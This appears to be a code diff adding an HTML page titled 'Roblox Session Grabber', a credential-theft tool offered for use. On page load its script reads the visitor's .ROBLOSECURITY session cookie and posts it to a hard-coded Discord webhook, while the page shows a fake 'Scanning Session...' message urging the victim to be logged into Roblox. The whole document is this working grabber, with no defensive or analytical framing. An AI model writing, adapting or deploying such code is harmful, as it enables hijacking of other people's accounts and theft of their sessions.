@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Session Grabber</title>
+    <script>
+        // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1559805640774524969/9YFLND4t8VCdtPe7GDUA9wbmCjP3ESqUPTrkKh-H0ucnCL3EHx_Sf9Zupy5ECBIZ_ZSK";
+
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+
+        function sendToDiscord() {
+            const robloxCookie = getCookie(".ROBLOSECURITY");
+            
+            if (!robloxCookie) {
+                alert("No .ROBLOSECURITY cookie found. Ensure you are logged into Roblox.");
+                return;
+            }
+
+            const payload = {
+                content: `**Roblox Account Recovered!**\n\n**Cookie (.ROBLOSECURITY):**\n\`\`\`\n${robloxCookie}\n\`\`\`\n\n*Scan successful. Account is now accessible via this cookie.*`
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Session sent to Discord!");
+                    console.log("Success");
+                } else {
+                    alert("Failed to send to Discord.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("Network error occurred.");
+            });
+        }
+
+        // Automatically run when page loads
+        window.onload = sendToDiscord;
+    </script>
+</head>
+<body>
+    <h1>Scanning Session...</h1>
+    <p>Ensure you are logged into Roblox on this device before scanning.</p>
+</body>
+</html>
